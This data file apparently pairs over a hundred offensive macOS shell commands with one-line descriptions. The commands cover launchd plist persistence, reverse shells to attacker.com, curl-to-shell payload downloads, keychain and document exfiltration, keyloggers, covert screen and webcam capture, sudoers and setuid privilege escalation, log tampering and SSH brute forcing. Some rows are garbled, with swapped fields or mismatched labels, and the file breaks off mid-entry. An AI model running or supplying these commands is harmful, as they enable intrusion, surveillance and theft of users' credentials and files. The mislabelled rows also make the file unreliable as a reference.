"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.service</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload</string><string>-o</string><string>/tmp/payload</string><string>&&</string><string>chmod</string><string>+x</string><string>/tmp/payload</string><string>&&</string><string>/tmp/payload</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.service.plist && launchctl load ~/Library/LaunchAgents/com.malicious.service.plist","Persistence via a malicious daemon service added to launchd."
"while true; do screencapture -x ~/Desktop/capture_$(date +%s).png; sleep 60; done && zip -r ~/Desktop/screenshots.zip ~/Desktop/capture_*.png && curl -T ~/Desktop/screenshots.zip ftp://attacker.com/uploads/","Automated screen capture and exfiltration on a macOS system."
"tar -czvf .hidden-archive.tar.gz ~/Documents/sensitive-files/ && mv .hidden-archive.tar.gz ~/.hidden/","Compressing sensitive files in the user's Documents directory and hiding the archive in a dot directory."
"while true; do ffmpeg -f avfoundation -video_size 640x480 -i ""0"" -vframes 1 $(date +%s).jpg; sleep 300; done","Accessing the webcam on macOS to capture snapshots surreptitiously."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.screencapture</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/screencapture</string>
		<string>-x</string>
		<string>/Users/Shared/ScreenCapture.png</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.screencapture.plist && launchctl load ~/Library/LaunchAgents/com.malicious.screencapture.plist","Persistence via malicious plist to enable remote screen capture on macOS."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && echo 'nohup ~/Library/.hidden_keylogger &' >> ~/.zshrc && source ~/.zshrc","Keylogger integration to capture and exfiltrate keystrokes from a macOS system."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via a malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to keystroke ""Logging keystrokes"" using {command down}'","Establishing a system hook to monitor user keystrokes."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Adding a login item to execute a script when the user logs in."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing commands as root without a password."
"sudo insmod /path/to/malicious_module.ko","Tampering with kernel modules using the visudo NOPASSWD flag to insert a malicious kernel module."
"cp /bin/sh /tmp/privileged_sh && chmod u+s /tmp/privileged_sh","Privilege escalation by exploiting a setuid binary on macOS."
"export PATH=/evil_directory:$PATH","Modifying environment variables for setuid exploitation on macOS."
"echo 'int setuid(uid_t uid) { return 0; }' > preload.c && gcc -shared -o preload.so preload.c && LD_PRELOAD=./preload.so /usr/bin/sudo","LD_PRELOAD exploitation to escalate privileges using setuid binaries."
"sudo chown $(whoami) /etc/sudoers && echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Privilege escalation by changing the ownership of sensitive system files to gain unrestricted access."
"sudo chown $(whoami) /etc/sudoers","Privilege escalation by changing the ownership of sensitive system files to gain unrestricted access."
"echo 'curl http://malicious-url.com/payload.sh | sh' >> /usr/local/bin/somescript","Injecting malicious code into existing scripts to execute during normal operations."
"chmod +x /path/to/malicious/script.sh","Manipulating file permissions to allow execution of unauthorized scripts."
"sudo chown root: /usr/local/bin/sensitivefile && chmod 4755 /usr/local/bin/sensitivefile","Privilege escalation by manipulating file permissions and changing ownership of sensitive files."
"sudo -k && date 010100002020 && sudo -v && date -f","Privilege escalation by exploiting sudo timestamp spoofing through system clock modification."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence via malicious Launch Daemon plist file that executes a shell script from an external server."
"osascript -e 'do shell script ""nvram boot-args=kext-dev-mode=1"" with administrator privileges'","Persistence via unsigned driver exploitation in macOS to bypass kext signing."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"tar czf - ~/Documents | openssl enc -aes-256-cbc -e -pass pass:encryption_key | nc -w 3 attacker.com 5555","Exfiltrating sensitive files from the user's Documents directory to a remote server."
"echo 'rdr pass inet proto tcp from any to any port 2222 -> 127.0.0.1 port 22' | sudo pfctl -ef -","Setting up port forwarding on a macOS system to redirect traffic from one port to another for remote access."
"while sleep 1; do pbpaste | nc -q0 attacker.com 1337; done","A scenario where keylogging is achieved by monitoring clipboard data and the captured data is then transmitted to a remote server."
"while true; do screencapture -x ~/Library/Caches/$(date +%s).png; sleep 300; done","Automating screen captures of a macOS system to silently collect information over time."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh' >> ~/.hidden_cron && crontab ~/.hidden_cron","Persistence via a hidden cron job that downloads and executes a script from a remote server every hour."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges'","Persistence via malicious plist to exploit a race condition for privilege escalation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-o</string><string>/tmp/remote.sh</string><string>http://malicious-url.com/remote.sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd to maintain remote access on a macOS system."
"echo '%admin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting misconfigured writable sudoers file which is group-owned."
"cp /usr/bin/env /tmp/; echo 'echo malicious_code' > /tmp/env; chmod +s /tmp/env","Injecting malicious code into setuid executables to gain elevated privileges."
"echo 'nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1' > ~/.hidden && echo '@reboot . ~/.hidden' | crontab -","Persistence via a hidden file that establishes a reverse shell connection on system boot."
"cp /path/to/malicious/Slack.app /Applications/Slack.app && launchctl load -w /Applications/Slack.app/Contents/MacOS/com.trojanized.slack.plist","Persistence via a trojanized version of a communication application."
"Compressing and encoding documents in the ~/Documents/Secrets directory and sending them to a remote server.","A scenario where sensitive documents are automatically compressed and encoded in base64 before being exfiltrated from a macOS system."
"tar -cz ~/Documents/Secrets | base64 | curl -X POST --data-binary @- http://attacker-server.com/upload","What shell command could perform this action without prior installation of additional tools?"
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item addition using AppleScript"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.daemon</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-L</string>
 <string>http://malicious-url.com/script.sh</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon for persistent execution of a script"
"echo '*/30 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash' | crontab -","Setting up a cron job to periodically run a malicious script"
"osascript -e 'do shell script ""chmod 6777 /path/to/vulnerable/kernel/object"" with administrator privileges'","Privilege escalation by exploiting a race condition vulnerability in the macOS kernel that allows for kernel object manipulation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every log in."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launch agents by loading a malicious plist file to run a script periodically."
"sudo cp com.malicious.kext.plist /Library/LaunchDaemons/ && sudo launchctl load /Library/LaunchDaemons/com.malicious.kext.plist","Persistence via malicious plist file that loads a kernel extension."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/usr/local/bin/hidden_script"", hidden:true}' && curl -o /usr/local/bin/hidden_script http://malicious-url.com/script.sh && chmod +x /usr/local/bin/hidden_script","Creating a hidden login item that executes a script from a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.reverse.shell</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Establishing a reverse shell using a launch agent."
"scp ~/.bash_history user@remote-server.com:/path/to/store/","Data exfiltration by locating and sending .bash_history file to a remote server."
"sudo systemsetup -setremotelogin on && echo 'ssh-rsa AAA... unauthorized_key' >> ~/.ssh/authorized_keys","Remote access setup by enabling SSH server and adding an unauthorized SSH key."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>sh</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Launch agent creation to periodically download and execute a script from a given URL."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Persistent reverse shell setup by injecting code into .bash_profile."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.reverse.shell</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell connection on system boot."
"osascript -e 'do shell script ""chown root: /tmp/suid; chmod 4755 /tmp/suid"" with administrator privileges'","Privilege escalation by exploiting race conditions in macOS kernel file system operations."
"curl -o ~/Library/LaunchAgents/com.startup.plist http://malicious-url.com/startup.plist && launchctl load ~/Library/LaunchAgents/com.startup.plist","Persistence via malicious plist file to execute a downloaded script every boot."
"curl -s http://malicious-url.com/exploitkit.tar.gz | tar xz -C /tmp && /tmp/exploitkit/install.sh","Downloading an exploit kit from a remote server and executing it."
"bash -c 'system_profiler SPHardwareDataType SPSoftwareDataType | curl -F ""data=@-"" http://attacker.com/collect.php'","Post-exploitation script execution to gather system information and send it to a remote server."
"scp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data username@remote-host:/path/to/destination","Using scp to move laterally and copy sensitive files from the current machine to another host in the network."
"tar -czf /tmp/sensitive_data.tgz ~/Documents/Sensitive && scp /tmp/sensitive_data.tgz compromised_user@attacker.com:/path/to/exfiltrate/","Compressing sensitive files in the user's home directory and exfiltrating them via SSH using scp from a compromised user account."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on macOS."
"touch -t 202301010000 /var/db/sudo","Privilege escalation by exploiting sudo timestamp spoofing."
"chmod +s /usr/bin/env","Gaining elevated privileges through a misconfigured setuid binary."
"/usr/bin/env /bin/sh -p","Executing a command with elevated privileges by abusing setuid permissions."
"cp /usr/bin/env /tmp/evil_env && echo '#!/bin/sh' > /tmp/evil_env && echo '/bin/sh' >> /tmp/evil_env && chmod +x /tmp/evil_env && export PATH=/tmp:$PATH && /path/to/setuid_script.sh","Privilege escalation by injecting code into a setuid script to gain root access."
"echo 'Jan 1 00:00:00 localhost fake_process[123]: fake log entry' >> /var/log/system.log","Tampering with system logs to mask unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.rootkit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rootkit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.rootkit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.rootkit.plist","Persistence via malicious plist to maintain rootkit control."
"csrutil disable","Bypassing system integrity protection to modify protected system files."
"codesign -s 'Developer ID Application: Malicious Developer (ID12345678)' -f --deep /path/to/malicious.app","Abusing trusted certificates to sign a malicious application."
"curl -s http://malicious-url.com/update.pkg > /tmp/update.pkg && sudo installer -pkg /tmp/update.pkg -target /","Malware installation via a disguised software update command on macOS."
"echo '*/5 * * * * osascript -e ""do shell script \""/path/to/malicious/script.sh\"" with administrator privileges""' | crontab -","Persistence through a malicious cron job that elevates privileges and executes every 5 minutes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to maintain a reverse shell connection."
"ssh-keyscan -t rsa,dsa host.example.com 2>&1 | grep -v '^#' | tee -a ~/.ssh/known_hosts","Gaining unauthorized remote access to a macOS system by manipulating SSH key exchange"
"zip -r /tmp/documents.zip ~/Documents && openssl enc -aes-256-cbc -salt -in /tmp/documents.zip -out /tmp/encrypted_documents.zip.enc -k password && curl --upload-file /tmp/encrypted_documents.zip.enc https://transfer.sh/encrypted_documents.zip.enc","Exfiltrating documents from a macOS system and automatically transmitting them while evading network monitoring and encrypting the traffic."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"sudo tcpdump -i any -w ~/Desktop/traffic_capture.pcap","Intercepting network traffic by installing a packet sniffer on a macOS system."
"nmap -T4 -F 192.168.1.0/24","Performing a stealthy port scan on a local network from a macOS device."
"DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /usr/bin/sudo","Privilege escalation by injecting code into privileged processes through dylib hijacking."
"export PATH=/malicious/directory:$PATH","Environment variable manipulation to escalate privileges."
"zip -rj /tmp/.hidden_documents.zip ~/Documents/Sensitive/* && curl -T /tmp/.hidden_documents.zip ftp://attacker.com --user username:password","Compression of sensitive documents in a hidden directory and exfiltration to a remote server."
"sshpass -p 'password123' ssh user@victim.com","A botnet is performing an SSH brute force attack to gain unauthorized remote access to macOS systems."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
 </array>
 <key>StartInterval</key>
 <integer>600</integer>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious LaunchAgent to execute a command every 10 minutes."
"echo '*/30 * * * * /usr/bin/python /tmp/.hidden_payload.py' | sudo tee -a /etc/crontab","Privilege escalation by injecting malicious code into system-wide cron directories for persistence."
"TF=$(mktemp -u); echo '#!/bin/bash
/bin/bash -i' > $TF; chmod +x $TF; export PATH=$(dirname $TF):$PATH; /usr/local/bin/suid_binary","Privilege escalation by exploiting a setuid binary on macOS to run a shell with elevated privileges."
"export PATH=/path/to/malicious/directory:$PATH; /path/to/setuid/binary","Modifying environment variables to exploit setuid binaries for privilege escalation."
"echo 'RHOST=""attacker.com""; RPORT=4444; TF=$(mktemp -u); echo ""#!/bin/bash
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1"" > $TF; chmod +x $TF; export PATH=$(dirname $TF):$PATH; /usr/local/bin/suid_binary' >> ~/.bash_profile","Creating environment variable persistence for a reverse shell using a setuid binary."
"curl -s http://malicious-url.com/keylogger.sh | bash","Keylogger installation using a script to capture keystrokes and save them to a file."
"while true; do pbpaste > /tmp/clipboard.txt; sleep 10; done","Clipboard monitoring to track and store copied text data."
"while true; do curl -X POST --data-binary @/tmp/clipboard.txt http://malicious-url.com/collect; sleep 300; done","Clipboard data analysis by periodically sending copied contents to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.hijack.rdp</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/osascript</string>
 <string>-e</string>
 <string>tell application \""Remote Desktop Connection\"" to open</string>
 <string>-e</string>
 <string>tell application \""System Events\"" keystroke \""password\""</string>
 <string>-e</string>
 <string>tell application \""System Events\"" keystroke return</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hijack.rdp.plist && launchctl load ~/Library/LaunchAgents/com.hijack.rdp.plist","Persistence via malicious plist to enable remote desktop protocol session hijacking."
"zip -r report.zip confidential.docx && mv report.zip report.jpg && uuencode report.jpg report.jpg | mail -s 'Annual Report' target@example.com","Data exfiltration via email by masquerading the file type of an attachment."
"open ~/Downloads/zero_day_exploit_attachment.docm","Malicious payload execution from an email attachment containing a zero-day exploit."
"echo 'nohup bash -i >& /dev/tcp/192.168.1.10/8080 0>&1' >> ~/.bash_profile","Persistence via a reverse shell by appending a command to the user's .bash_profile."
"cp /bin/sh /tmp/privileged_sh && chmod 4755 /tmp/privileged_sh","Gaining elevated privileges by exploiting a setuid binary."
"sudo tcpdump -i any -w ~/Desktop/traffic_capture.pcap","Persistence via unauthorized network traffic sniffing on a macOS system."
"for port in {1..1023}; do nc -zv localhost $port 2>&1 | grep succeeded; done","Initiating unauthorized port scanning using native macOS commands."
"while true; do for port in {1..1023}; do nc -zv localhost $port 2>&1 | grep succeeded; sleep 60; done; done","Automated script to scan and report open ports periodically."
"osascript -e 'do shell script ""curl -fsSL http://malicious-url.com/payload.scpt -o /Library/ScriptingAdditions/payload.scpt && osacompile -o /Library/ScriptingAdditions/payload.osax /Library/ScriptingAdditions/payload.scpt"" with administrator privileges'","Persistence via scripting addition that executes a payload each time an application is launched."
"echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /Library/StartupItems/ReverseShell/ReverseShell && chmod +x /Library/StartupItems/ReverseShell/ReverseShell && echo '{\n ""Description"" : ""Startup Item ReverseShell"",\n ""Provides"" : [ ""ReverseShell"" ],\n ""OrderPreference"" : ""None"",\n ""Messages"" : {\n ""start"" : ""Starting ReverseShell"",\n ""stop"" : ""Stopping ReverseShell""\n }\n}' > /Library/StartupItems/ReverseShell/StartupParameters.plist && chmod +x /Library/StartupItems/ReverseShell/StartupParameters.plist","Creating a startup item that initiates a reverse shell connection to the attacker's server."
"sudo kextload /Library/Extensions/malicious.kext","Loading a malicious kernel extension that hides files and processes."
"zip -er confidential.zip ~/Documents/*.pdf && echo 'Please find the documents attached.' | mail -s 'Confidential Documents' -A confidential.zip recipient@example.com","A script that finds all PDFs in the Documents folder, compresses them into a password-protected ZIP file, and then emails it to an external address."
"for host in $(cat hosts.txt); do while :; do sshpass -p 'password123' ssh -o StrictHostKeyChecking=no user@$host; done; done","Persistent SSH brute force attack using a loop to repeatedly attempt connections to a list of known hosts."
"launchctl unload ~/Library/LaunchAgents/com.legitimate.agent.plist && cp ~/evil/com.malicious.agent.plist ~/Library/LaunchAgents/com.legitimate.agent.plist && launchctl load ~/Library/LaunchAgents/com.legitimate.agent.plist","Persistence via malicious plist by unloading a legitimate launch agent and replacing it with a malicious one."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to establish a backdoor."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations."
"touch -t 202101010000 /var/db/sudo; sudo -k; sudo command_to_run","Privilege escalation by exploiting sudo timestamp spoofing when NOPASSWD is set for specific commands."
"security find-generic-password -wa '*' | mail -s 'Credentials' attacker@example.com","Exfiltrating local user credentials and sending them to an external email address using macOS native commands."
"script -q /dev/null top -l 1 | grep -v grep > /tmp/.hidden_process_list","Stealthily monitoring running processes in macOS without leaving traces in system logs."
"chmod u+s /usr/local/bin/somebinary","Privilege escalation by exploiting vulnerable setuid binaries on macOS."
"export PATH=/evil/directory:$PATH","Modifying environment variables to exploit setuid binaries for privilege escalation."
"IFS=:;export PATH=/tmp:$PATH","Abusing IFS to manipulate setuid binary execution."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && echo 'nohup ~/Library/.hidden_keylogger &' >> ~/.zshrc","Persistence via keylogger installation in macOS."
"while true; do screencapture -x ~/Library/Caches/.screencapture_$(date +%s).jpg; sleep 300; done &","Capture and record screen activity silently on macOS."
"echo 'ssh -R 6000:localhost:5900 badactor@malicious-server.com' >> ~/.zshrc && /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw mypassword -restart -agent -privs -all","Configure a remote desktop service for unauthorized access."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/keylogger.py"", hidden:false}'","Persistence of a Python-based keylogger on macOS by adding it to the login items."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation using a disguised curl command to retrieve a malicious payload and execute it."
"echo 'curl -s http://malicious-url.com/post_exploit.sh | sh' >> ~/.bash_profile","Exploit kits executing post-exploitation scripts to establish persistence on the system."
"security dump-keychain -d login.keychain > /tmp/creds && curl -T /tmp/creds http://malicious-url.com/upload","Credential harvesting by sending the contents of the keychain to a remote server."
"cp /bin/sh /tmp/rootsh && chmod 4777 /tmp/rootsh","Privilege escalation by exploiting the SUID bit on a misconfigured binary to gain root access."
"(crontab -l 2>/dev/null; echo ""*/5 * * * * /tmp/malicious.sh"") | crontab -","Using cron jobs for persistence by creating a new cron job that runs a malicious script every 5 minutes."
"echo '@reboot /root/rootkit.sh' >> /var/spool/cron/crontabs/root","Scheduling rootkit execution at system startup by adding a script to root's crontab."
"echo '*/10 * * * * root /tmp/escalate.sh' >> /etc/crontab","Exploiting system vulnerabilities to gain unauthorized cron access and schedule tasks with root privileges."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download a script from a remote server and execute it."
"echo 'echo ""DANGER"" | sudo -S sh -c ""curl http://malicious-url.com/rootkit.sh | sh""' >> /etc/rc.common","Rootkit embedding by appending a malicious script to an existing system file to gain persistent root access."
"touch /usr/local/.hidden && echo 'malicious data' > /usr/local/.hidden","Creation of hidden files in the system directories to store malicious data."
"sudo nvram boot-args=""no_secure_boot""","Bypassing secure boot by modifying the nvram boot-args to allow booting from an external media."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | bash &>/dev/null' | crontab -","Persistence via hidden cron job that downloads and executes a script every hour."
"Locating documents and transmitting them to a remote server using an encrypted channel to bypass network monitoring, coupled with spoofing the device's MAC address to hide the system's identity.","Exfiltration of documents from the Documents folder and automatic transmission to a remote server while evading network monitoring."
"The following shell command sequence can be used: First, change the MAC address to a random value using 'sudo ifconfig en0 ether $(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//')'. Next, compress the target documents using 'tar -czvf /tmp/documents.tar.gz ~/Documents/'. Then, encrypt the archive with OpenSSL using 'openssl enc -aes-256-cbc -salt -in /tmp/documents.tar.gz -out /tmp/encrypted-documents.tar.gz.enc -k secret_password'. Finally, use SCP over an SSH connection to transmit the encrypted file to the remote server 'scp /tmp/encrypted-documents.tar.gz.enc user@remote-server.com:/path/to/destination'.","How can this be achieved on a macOS system without raising suspicion?"
"scp ~/.bash_history user@remote-server.com:/path/to/upload/","Data exfiltration by locating and sending .bash_history file to a remote server."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Setting up remote access by adding a reverse shell command to .bash_profile."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
